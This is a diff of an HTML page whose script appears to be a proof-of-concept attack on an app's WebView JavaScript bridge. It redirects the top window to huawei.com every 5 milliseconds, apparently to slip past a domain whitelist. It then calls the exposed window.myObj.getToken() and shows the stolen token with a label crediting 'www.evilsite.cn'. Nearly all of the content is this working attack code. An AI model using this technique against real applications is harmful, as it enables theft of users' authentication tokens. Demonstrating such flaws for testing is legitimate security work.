@@ -7,13 +7,26 @@
     </head>
     <body>
         <script>
-	function gotowhite(){
-            document.location.href = "https://www.huawei.com";
-        }
-	var test=function (){alert(window.myObj.getToken());};
-	setInterval(gotowhite,5);
-	setTimeout(test,1000);
+// 	function gotowhite(){
+//             document.location.href = "https://www.huawei.com";
+//         }
+// 	var test=function (){alert(window.myObj.getToken());};
+// 	setInterval(gotowhite,5);
+// 	setTimeout(test,1000);
 // 	document.location.href="https://www.huawei.com";
+		
+	function gotowhite(){
+            top.location.href = "https://www.huawei.com";
+        }
+        
+        function evil(){
+            var result = window.myObj.getToken();
+            document.getElementById("content").innerText = "www.evilsite.cn成功调用getParams获取到：\n"+result;
+        }
+        
+        setInterval(gotowhite,5);//5毫秒
+        setTimeout(evil,3000);//倒计时3秒
+		
 	</script>
     </body>
 </html>
